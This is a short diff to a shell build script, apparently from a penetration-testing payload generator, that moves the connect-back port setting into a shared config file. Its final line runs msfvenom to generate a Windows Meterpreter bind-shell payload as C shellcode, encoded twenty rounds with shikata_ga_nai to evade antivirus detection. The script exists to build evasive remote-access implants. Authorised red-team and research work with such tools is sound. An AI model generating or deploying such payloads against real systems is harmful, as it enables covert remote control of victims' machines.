@@ -7,8 +7,11 @@
 # or enter $win32_compiler="mycompiler" here
 . build/global_win32.sh
 
-# configure your connect-back settings here
-LPORT=8443
+# import global default lhost and lport values from build/global_connect_config.sh
+. build/global_connect_config.sh
+
+# override connect-back settings here, if necessary
+LPORT=$GLOBAL_LPORT
 
 # make meterpreter bind payload, encoded 20 rounds with shikata_ga_nai
 msfvenom -p windows/meterpreter/bind_tcp lport=$LPORT -e x86/shikata_ga_nai -i 20 -f c -a x86 --platform Windows > sc.txt
